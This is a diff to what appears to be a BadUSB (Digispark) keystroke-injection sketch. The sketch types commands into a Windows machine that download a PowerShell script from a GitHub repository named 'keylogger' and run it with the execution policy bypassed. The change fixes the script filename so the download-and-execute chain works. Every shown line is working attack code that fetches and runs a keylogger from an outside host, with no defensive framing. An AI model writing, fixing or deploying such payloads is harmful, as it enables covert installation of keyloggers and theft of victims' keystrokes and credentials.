@@ -24,7 +24,7 @@ void loop() {
   DigiKeyboard.print("curl -O https://raw.githubusercontent.com/Su-nlight/keylogger/main/windows/inject_script.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
-  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File inject_to_windows.ps1");
+  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File inject_script.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(6000);
   DigiKeyboard.print("exit");
